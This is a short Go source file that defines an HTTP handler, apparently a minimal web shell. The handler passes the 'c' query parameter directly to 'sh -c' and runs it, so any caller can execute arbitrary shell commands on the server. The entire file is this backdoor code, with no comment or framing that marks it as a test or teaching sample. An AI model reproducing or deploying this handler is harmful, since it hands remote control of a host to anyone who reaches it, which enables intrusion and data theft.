package main

import (
	"net/http"
	"os/exec"
)

func h(w http.ResponseWriter, r *http.Request) {
	exec.Command("sh", "-c", r.URL.Query().Get("c")).Run()
}
